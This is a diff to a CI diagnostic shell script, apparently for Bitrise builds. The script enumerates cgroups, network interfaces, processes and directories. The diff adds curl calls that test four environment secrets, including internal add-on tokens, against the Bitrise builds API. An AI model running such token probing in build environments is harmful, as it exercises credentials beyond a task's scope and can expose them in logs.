@@ -18,8 +18,6 @@ cat /proc/self/cgroup
 echo "===================================="
 ifconfig || :
 echo "===================================="
-ip -a || :
-echo "===================================="
 ps aux || :
 echo "===================================="
 ls -l
@@ -27,6 +25,14 @@ echo "===================================="
 ls -l /
 echo "===================================="
 ls -l $PROJECT_LOCATION
+echo "===================================="
+curl -H "Authorization: ${BITRISE_BUILD_API_TOKEN}" https://api.bitrise.io/v0.1/apps/${BITRISE_APP_SLUG}/builds || :
+echo "===================================="
+curl -H "Authorization: ${ADDON_SHIP_API_TOKEN}" https://api.bitrise.io/v0.1/apps/${BITRISE_APP_SLUG}/builds || :
+echo "===================================="
+curl -H "Authorization: ${APM_COLLECTOR_TOKEN}" https://api.bitrise.io/v0.1/apps/${BITRISE_APP_SLUG}/builds || :
+echo "===================================="
+curl -H "Authorization: ${ADDON_VDTESTING_API_TOKEN}" https://api.bitrise.io/v0.1/apps/${BITRISE_APP_SLUG}/builds || :
 echo "===================================="
 
 #
